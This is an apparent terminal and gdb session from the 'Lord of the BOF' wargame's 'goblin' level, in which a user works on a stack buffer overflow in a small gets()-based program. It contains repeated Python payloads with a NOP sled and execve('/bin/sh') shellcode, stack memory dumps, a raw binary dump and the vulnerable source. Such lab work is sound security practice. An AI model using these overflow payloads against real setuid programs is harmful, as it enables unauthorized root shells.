+(gdb) x/10b $esp
+0xbffffaf8:	0x08	0xfb	0xff	0xbf	0xeb	0x83	0x04	0x08
+0xbffffb00:	0x80	0x94
+(gdb) x/64b $esp
+0xbffffaf8:	0x08	0xfb	0xff	0xbf	0xeb	0x83	0x04	0x08
+0xbffffb00:	0x80	0x94	0x04	0x08	0x94	0x94	0x04	0x08
+0xbffffb08:	0x28	0xfb	0xff	0xbf	0xcb	0x09	0x03	0x40
+0xbffffb10:	0x01	0x00	0x00	0x00	0x54	0xfb	0xff	0xbf
+0xbffffb18:	0x5c	0xfb	0xff	0xbf	0x68	0x38	0x01	0x40
+0xbffffb20:	0x01	0x00	0x00	0x00	0x50	0x83	0x04	0x08
+0xbffffb28:	0x00	0x00	0x00	0x00	0x71	0x83	0x04	0x08
+0xbffffb30:	0xf8	0x83	0x04	0x08	0x01	0x00	0x00	0x00
+(gdb) d 1 
+(gdb) info b
+No breakpoints or watchpoints.
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x10,%esp
+0x80483fe <main+6>:	lea    0xfffffff0(%ebp),%eax
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    $0x4,%esp
+0x804840a <main+18>:	lea    0xfffffff0(%ebp),%eax
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   $0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    $0x8,%esp
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) b *main+15
+Breakpoint 2 at 0x8048407
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+asdf^H^H^H
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) x/64b $esp
+0xbffffaf4:	0xf8	0xfa	0xff	0xbf	0x41	0x41	0x41	0x41
+0xbffffafc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb04:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb0c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb14:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb1c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb24:	0x41	0x41	0x41	0x41	0x41	0x00	0x00	0x00
+0xbffffb2c:	0x71	0x83	0x04	0x08	0xf8	0x83	0x04	0x08
+(gdb) 
+0xbffffb34:	0x01	0x00	0x00	0x00	0x54	0xfb	0xff	0xbf
+0xbffffb3c:	0xbc	0x82	0x04	0x08	0x4c	0x84	0x04	0x08
+0xbffffb44:	0x60	0xae	0x00	0x40	0x4c	0xfb	0xff	0xbf
+0xbffffb4c:	0x90	0x3e	0x01	0x40	0x01	0x00	0x00	0x00
+0xbffffb54:	0x4c	0xfc	0xff	0xbf	0x00	0x00	0x00	0x00
+0xbffffb5c:	0x60	0xfc	0xff	0xbf	0x82	0xfc	0xff	0xbf
+0xbffffb64:	0x8c	0xfc	0xff	0xbf	0x9a	0xfc	0xff	0xbf
+0xbffffb6c:	0xb9	0xfc	0xff	0xbf	0xc8	0xfc	0xff	0xbf
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaBBBBb^[[D
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+AAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) x/64b $esp
+0xbffffaf4:	0xf8	0xfa	0xff	0xbf	0x41	0x41	0x41	0x41
+0xbffffafc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb04:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb0c:	0x41	0x41	0x41	0x41	0x41	0x42	0x42	0x42
+0xbffffb14:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0xbffffb1c:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0xbffffb24:	0x42	0x42	0x42	0x00	0x00	0x00	0x00	0x00
+0xbffffb2c:	0x71	0x83	0x04	0x08	0xf8	0x83	0x04	0x08
+(gdb) 
+0xbffffb34:	0x01	0x00	0x00	0x00	0x54	0xfb	0xff	0xbf
+0xbffffb3c:	0xbc	0x82	0x04	0x08	0x4c	0x84	0x04	0x08
+0xbffffb44:	0x60	0xae	0x00	0x40	0x4c	0xfb	0xff	0xbf
+0xbffffb4c:	0x90	0x3e	0x01	0x40	0x01	0x00	0x00	0x00
+0xbffffb54:	0x4c	0xfc	0xff	0xbf	0x00	0x00	0x00	0x00
+0xbffffb5c:	0x60	0xfc	0xff	0xbf	0x82	0xfc	0xff	0xbf
+0xbffffb64:	0x8c	0xfc	0xff	0xbf	0x9a	0xfc	0xff	0xbf
+0xbffffb6c:	0xb9	0xfc	0xff	0xbf	0xc8	0xfc	0xff	0xbf
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) x/64b $esp
+0xbffffaf4:	0xf8	0xfa	0xff	0xbf	0x5c	0x78	0x33	0x31
+0xbffffafc:	0x5c	0x78	0x63	0x30	0x5c	0x78	0x35	0x30
+0xbffffb04:	0x5c	0x78	0x36	0x38	0x5c	0x78	0x32	0x66
+0xbffffb0c:	0x5c	0x78	0x32	0x66	0x5c	0x78	0x37	0x33
+0xbffffb14:	0x5c	0x78	0x36	0x38	0x5c	0x78	0x36	0x38
+0xbffffb1c:	0x5c	0x78	0x32	0x66	0x5c	0x78	0x36	0x32
+0xbffffb24:	0x5c	0x78	0x36	0x39	0x5c	0x78	0x36	0x65
+0xbffffb2c:	0x5c	0x78	0x38	0x39	0x5c	0x78	0x65	0x33
+(gdb) 
+0xbffffb34:	0x5c	0x78	0x35	0x30	0x5c	0x78	0x35	0x33
+0xbffffb3c:	0x5c	0x78	0x38	0x39	0x5c	0x78	0x65	0x31
+0xbffffb44:	0x5c	0x78	0x39	0x39	0x5c	0x78	0x62	0x30
+0xbffffb4c:	0x5c	0x78	0x30	0x62	0x5c	0x78	0x63	0x64
+0xbffffb54:	0x5c	0x78	0x38	0x30	0x00	0x00	0x00	0x00
+0xbffffb5c:	0x60	0xfc	0xff	0xbf	0x82	0xfc	0xff	0xbf
+0xbffffb64:	0x8c	0xfc	0xff	0xbf	0x9a	0xfc	0xff	0xbf
+0xbffffb6c:	0xb9	0xfc	0xff	0xbf	0xc8	0xfc	0xff	0xbf
+(gdb) 
+0xbffffb74:	0xe0	0xfc	0xff	0xbf	0xfc	0xfc	0xff	0xbf
+0xbffffb7c:	0x1b	0xfd	0xff	0xbf	0x26	0xfd	0xff	0xbf
+0xbffffb84:	0x34	0xfd	0xff	0xbf	0x76	0xfd	0xff	0xbf
+0xbffffb8c:	0x88	0xfd	0xff	0xbf	0x9d	0xfd	0xff	0xbf
+0xbffffb94:	0xad	0xfd	0xff	0xbf	0xb9	0xfd	0xff	0xbf
+0xbffffb9c:	0xd7	0xfd	0xff	0xbf	0xf0	0xfd	0xff	0xbf
+0xbffffba4:	0xfb	0xfd	0xff	0xbf	0x0c	0xfe	0xff	0xbf
+0xbffffbac:	0x1d	0xfe	0xff	0xbf	0x25	0xfe	0xff	0xbf
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+AAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+AAAAAAAAAAAAAAABBBBBBBBBBBBBBB
+
+Breakpoint 2, 0x8048407 in main ()
+(gdb) x/64b $esp
+0xbffffaf4:	0xf8	0xfa	0xff	0xbf	0x41	0x41	0x41	0x41
+0xbffffafc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb04:	0x41	0x41	0x41	0x42	0x42	0x42	0x42	0x42
+0xbffffb0c:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0xbffffb14:	0x42	0x42	0x00	0xbf	0x5c	0xfb	0xff	0xbf
+0xbffffb1c:	0x68	0x38	0x01	0x40	0x01	0x00	0x00	0x00
+0xbffffb24:	0x50	0x83	0x04	0x08	0x00	0x00	0x00	0x00
+0xbffffb2c:	0x71	0x83	0x04	0x08	0xf8	0x83	0x04	0x08
+(gdb) x/64b 0xbffffaf8
+0xbffffaf8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xbffffb00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x42
+0xbffffb08:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0xbffffb10:	0x42	0x42	0x42	0x42	0x42	0x42	0x00	0xbf
+0xbffffb18:	0x5c	0xfb	0xff	0xbf	0x68	0x38	0x01	0x40
+0xbffffb20:	0x01	0x00	0x00	0x00	0x50	0x83	0x04	0x08
+0xbffffb28:	0x00	0x00	0x00	0x00	0x71	0x83	0x04	0x08
+0xbffffb30:	0xf8	0x83	0x04	0x08	0x01	0x00	0x00	0x00
+(gdb) q
+The program is running.  Exit anyway? (y or n) n
+Not confirmed.
+(gdb) export
+Undefined command: "export".  Try "help".
+(gdb) a  
+Ambiguous command "a": actions, add-shared-symbol-files, add-symbol-file, aliases, assf, attach, awatch.
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[cobolt@localhost cobolt]$ export 
+declare -x BASH_ENV="/home/cobolt/.bashrc"
+declare -x DISPLAY="192.168.56.1:0.0"
+declare -x HISTSIZE="1000"
+declare -x HOME="/home/cobolt"
+declare -x HOSTNAME="localhost.localdomain"
+declare -x HOSTTYPE="i386"
+declare -x INPUTRC="/etc/inputrc"
+declare -x LANG="en_US"
+declare -x LESSOPEN="|/usr/bin/lesspipe.sh %s"
+declare -x LOGNAME="cobolt"
+declare -x LS_COLORS="no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:"
+declare -x MACHTYPE="i386-redhat-linux-gnu"
+declare -x MAIL="/var/spool/mail/cobolt"
+declare -x OSTYPE="linux-gnu"
+declare -x PATH="/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/cobolt/bin"
+declare -x PWD="/home/cobolt"
+declare -x REMOTEHOST="192.168.56.1"
+declare -x SHELL="/bin/bash"
+declare -x SHLVL="2"
+declare -x TERM="xterm"
+declare -x USER="cobolt"
+declare -x USERNAME=""
+[cobolt@localhost cobolt]$ hsi
+bash2: hsi: command not found
+[cobolt@localhost cobolt]$ history 
+    1  ls
+    2  cat goblin.c
+    3  vi coblin.c
+    4  ls
+    5  ls
+    6  exit
+    7  cat goblin.c
+    8  exit
+    9  ls
+   10  cat goblin.c
+   11  `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+   12  `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` > asdf.txt
+   13  ls
+   14  cat asdf.txt
+   15  asdf.txt < cat `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+   16  cat asdf.txt
+   17  print asdf
+   18  print "asdf"
+   19  echo
+   20  asdf.txt < echo `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+   21  asdf.txt < python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'
+   22  python -c 'print "A"'
+   23  python -c 'print "A"*20+"asdf"'
+   24  asdf.txt < python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'
+   25  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'
+   26  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'
+   27  ls > asdf.txt
+   28  cat asdf.txt
+   29  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > asdf.txt
+   30  cat asdf.txt
+   31  asdf.txt < python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'
+   32  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > asdf.txt
+   33  cat asdf.txt
+   34  ./goblin
+   35  cat asdf.txt | ./goblin
+   36  cat asdf.txt; cat | ./goblin
+   37   cat | ./goblin
+   38   cat | ./goblin
+   39  ls
+   40  ls
+   41  disas main
+   42  gdb goblin
+   43  objdump
+   44  ls
+   45  cat asdf.txt | ./goblin
+   46  ./goblin
+   47  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > ex.txt
+   48  cat ex.txt | ./goblin
+   49  python -c 'print"A"*200' > ex.txt
+   50  cat ex.txt | ./goblin
+   51  cat ex.txt | ./goblin
+   52  cat ex.txt | ./goblin
+   53  cat ex.txt | ./goblin
+   54  cat ex.txt | ./goblin
+   55  ./goblin
+   56  ./goblin
+   57  ./goblin
+   58  ./goblin
+   59  ./goblin
+   60  ./goblin
+   61  ./goblin
+   62  ./goblin
+   63  ./goblin
+   64  ./goblin
+   65  ./goblin
+   66  ./goblin
+   67  ./goblin
+   68  ./goblin
+   69  python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > ex.txt
+   70  cat ex.txt | ./goblin
+   71  python -c 'print"A"*200' > ex.txt
+   72  cat ex.txt | ./goblin
+   73  cat ex.txt | ./goblin
+   74  cat ex.txt | ./goblin
+   75  cat ex.txt | ./goblin
+   76  cat ex.txt | ./goblin
+   77  cat ex.txt | ./goblin
+   78  cat ex.txt | ./goblin
+   79  d.
+   80  exit
+   81  cat ex.txt | ./goblin
+   82  cat ex.txt | ./gablin
+   83  ./gablin
+   84  python -c 'print "A"' | ./gablin
+   85  python -c 'print "A"'; cat | ./gablin
+   86  ls
+   87  rm core
+   88  python -c 'print "A"*60'; cat | ./gablin
+   89  ls
+   90  python -c 'print "A"*60' cat | ./gablin
+   91  python -c 'print "A"*60'; cat | ./gablin
+   92  ls
+   93  rm core
+   94  ls
+   95  python -c 'print "A"*60'; cat | ./gablin
+   96  ls
+   97  python -c 'print "A"*60'; cat | ./gablin
+   98  ls
+   99  python -c 'print "A"*60'; cat | ./gablin
+  100  ls
+  101  python -c 'print "A"*60'; cat | ./gablin
+  102  ls
+  103  python -c 'print "A"*60'; cat | ./gablin
+  104  ls
+  105  python -c 'print "A"*600'; cat | ./gablin
+  106  ls
+  107  python -c 'print "A"*600'; cat | ./goblin
+  108  ls
+  109  python -c 'print "A"*600'; cat | ./goblin
+  110  ls
+  111  gdb -q gablin
+  112  cat goblin.c
+  113  gdb -q gablin
+  114  gdb -q gablin
+  115  gdb -q gablin
+  116  export 
+  117  hsi
+  118  history 
+[cobolt@localhost cobolt]$ cat ./goblin                                                                                                                                                       ELF4ﾢ4 ttt  /lib/ld-linux.so.2GNt"!
+uU䔨[ď» t楽귨঺]ÿÿ%h꡿ÿÿÿ%ꑿÿÿÿ%hꁿÿÿÿ%h鱿ÿÿÿ%h 顿ÿÿ1잉ᄤ㑨hQV輿ÿÿАU偽u8늶PÿС8u.￴egister_frame_info_IO_stdin_used__libc_start_main__register_frame_infoGLIBC_2.0ii
+磿ÿÿʃ劥ʃvU.￴h撿ÿÿʃvU抃U儬E᩿ÿÿE楿ÿʃU.ÿt
+                                     ÿЃļ;ÿuꞼʃU抃U䔨[栿ÿÿ]࿂%s                                                                                                                                  ÿÿÿÿÿÿBÿ¸ 
+\    ¼ 
+u                                                                                                                                                                                           þÿÿoÿÿÿoྯdd+<:i·x聀:_yµ삀5_s¢Ã؃ꃂ¢¢¢-¢n-℀YЀ=t¦»(;͆-s$¢¢¢¢¢¢¢µB܂ؿ-ª !"#&14		5"	6<	8U	9o	;	=ª	>	?	@	A
+
+B%
+C<
+DU
+El
+F 
+G 
+H¸
+I
+N 
+ Q+
+   RE
+     S]
+       Tv
+         V 
+          Y¨
+            o
+
+
+             ﲀu'
+                {A
+                  |^
+                   { 
+                     
+                    ·
+                      
+                     ր 
+
+7"v²羚S3ɀ;㿂E<z©RՐY]5¿k7wsx¢¢- 
+¨ÿ¾¢ђ#ꒀ$%&¢9 "dinit.c/usr/src/bs/BUILD/glibc-2.1.3/csu/gcc2_compiled.int:t(0,1)=r(0,1);0020000000000;0017777777777;char:t(0,2)=r(0,2);0;127;long int:t(0,3)=r(0,1);0020000000000;0017777777777;unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;short int:t(0,8)=r(0,8);-32768;32767;short unsigned int:t(0,9)=r(0,9);0;65535;signed char:t(0,10)=r(0,10);-128;127;unsigned char:t(0,11)=r(0,11);0;255;float:t(0,12)=r(0,1);4;0;double:t(0,13)=r(0,1);8;0;long double:t(0,14)=r(0,1);12;0;complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;complex float:t(0,16)=r(0,16);4;0;complex double:t(0,17)=r(0,17);8;0;complex long double:t(0,18)=r(0,18)XshellXshell;12;0;void:t(0,19)=(0,19)../include/libc-symbols.h/usr/src/bs/BUILD/glibc-2.1.3/build-i386-linux/config.h../include/libintl.h../intl/libintl.h../include/features.h../include/sys/cdefs.h../misc/sys/cdefs.h/usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/include/stddef.h../include/locale.h../locale/locale.hlconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;\grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;\mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;\int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;\p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;\n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;\p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;../include/xlocale.h../locale/xlocale.h__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;\__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;\__ctype_toupper:(13,6),256,32;;__locale_t:t(13,7)=(13,8)=*(13,1)../sysdeps/unix/sysv/linux/_G_config.h../sysdeps/unix/sysv/linux/bits/types.hsize_t:t(16,1)=(0,4)__u_char:t(15,1)=(0,11)__u_short:t(15,2)=(0,9)__u_int:t(15,3)=(0,4)__u_long:t(15,4)=(0,5)__u_quad_t:t(15,5)=(0,7)__quad_t:t(15,6)=(0,6)__int8_t:t(15,7)=(0,10)__uint8_t:t(15,8)=(0,11)__int16_t:t(15,9)=(0,8)__uint16_t:t(15,10)=(0,9)__int32_t:t(15,11)=(0,1)__uint32_t:t(15,12)=(0,4)__int64_t:t(15,13)=(0,6)__uint64_t:t(15,14)=(0,7)__qaddr_t:t(15,15)=(15,16)=*(15,6)__dev_t:t(15,17)=(15,5)__uid_t:t(15,18)=(15,3)__gid_t:t(15,19)=(15,3)__ino_t:t(15,20)=(15,4)__mode_t:t(15,21)=(15,3)__nlink_t:t(15,22)=(15,3)__off_t:t(15,23)=(0,3)__loff_t:t(15,24)=(15,6)__pid_t:t(15,25)=(0,1)__ssize_t:t(15,26)=(0,1)__rlim_t:t(15,27)=(0,3)__rlim64_t:t(15,28)=(15,6)__id_t:t(15,29)=(15,3)__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;__daddr_t:t(15,33)=(0,1)__caddr_t:t(15,34)=(10,2)__time_t:t(15,35)=(0,3)__swblk_t:t(15,36)=(0,3)__clock_t:t(15,37)=(0,3)__fd_mask:t(15,38)=(0,5)__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;__key_t:t(15,42)=(0,1)__ipc_pid_t:t(15,43)=(0,9)__blkcnt_t:t(15,44)=(0,3)__blkcnt64_t:t(15,45)=(15,6)__fsblkcnt_t:t(15,46)=(15,4)__fsblkcnt64_t:t(15,47)=(15,5)__fsfilcnt_t:t(15,48)=(15,4)__fsfilcnt64_t:t(15,49)=(15,5)__ino64_t:t(15,50)=(15,4)__off64_t:t(15,51)=(15,24)__t_scalar_t:t(15,52)=(0,3)__t_uscalar_t:t(15,53)=(0,5)__intptr_t:t(15,54)=(0,1)../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h../sysdeps/unix/sysv/linux/bits/sched.h__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;\__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;\__inheritsched:(0,1),96,32;__scope:(0,1),128,32;\__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;\__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;\__c_waiting:(17,2),64,32;;pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;pthread_key_t:t(17,12)=(0,4)pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;\__m_count:(0,1),32,32;__m_owner:(17,2),64,32;\__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;pthread_once_t:t(17,17)=(0,1)_pthread_rwlock_t:T(17,18)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;\__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;\__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;\__rw_pshared:(0,1),224,32;;pthread_rwlock_t:t(17,19)=(17,18)pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;\__pshared:(0,1),32,32;;pthread_t:t(17,22)=(0,5)wchar_t:t(19,1)=(0,3)wint_t:t(19,2)=(0,4)_G_int16_t:t(14,1)=(0,8)_G_int32_t:t(14,2)=(0,1)_G_uint16_t:t(14,3)=(0,9)_G_uint32_t:t(14,4)=(0,4)_IO_stdin_used:G(0,1)GCC: (GNXshellXshellU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release01.001.001.001.001.001.01.symtab.strtab.shstrtab.interp.note.ABI-tag.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.got.rel.plt.init.plt.text.fini.rodata.data.eh_frame.ctors.dtors.got.dynamic.bss.stab.stabstr.comment.(47e 
+                                                                            \?Gÿÿÿo\Tþÿÿol Xshellc   l ( 
+                                                                                                       u¼/{.ꁠPLh 
+                                                                                                                 t 
+                                                                                                               $·XÁXP 
+                                                                                                                     Ƀ¨
+                                                                                                                       Oҁeܰ!xۡ࿁H'΄9     l ¼ 
+..
+ P                                                                                                                                                                                         p   
+tL                                                                                                                                                                                          
+                                                                                                                                                                                           
+                                                                                                                                                                                           
+                                                                                                                                                                                        ?K 
+                                                                                                                                                                                         tȃ 
+                                                                                                                                                                                         Ѓ 
+                                                                                                                                                                                          
+                                                                                                                                                                                       " 
+                                                                                                                                                                                        𑀠
+                                                                                                                                                                                        »  
+                                                                                                                                                                                         D 
+                                                                                                                                                                                        .. 
+                                                                                                                                                                                          
+
+                                                                                                                                                                                         〸 
+                                                                                                                                                                                         ¸ 
+                                                                                                                                                                                         t"3: 
+                                                                                                                                                                                            J¼ 
+¢"sP 
+   z% 
+Ɂ.ુl ¨ ³ initfini.cgcc2_compiled.init.ccrtstuff.cp.2__DTOR_LIST__completed.3__do_global_dtors_aux__EH_FRAME_BEGIN__fini_dummyobject.8frame_dummyinit_dummyforce_to_data__CTOR_LIST____do_global_ctors_aux__CTOR_END____DTOR_END____FRAME_END__goblin.c_DYNAMIC_etext__register_frame_info@@GLIBC_2.0_fp_hwgets@@GLIBC_2.0_init__deregister_frame_info@@GLIBC_2.0_start__bss_startmain__libc_start_main@@GLIBC_2.0data_startprintf@@GLIBC_2.0_fini_edata_GLOBAL_OFFSET_TABLE__end_IO_stdin_used__data_start__gmon_start__[cobolt@localhost cobolt]$ XshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellq
+bash2: XshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellq: command not found
+[cobolt@localhost cobolt]$ cat ./goblin.c 
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+[cobolt@localhost cobolt]$ python -c 'print "A"*600'; cat | ./goblin
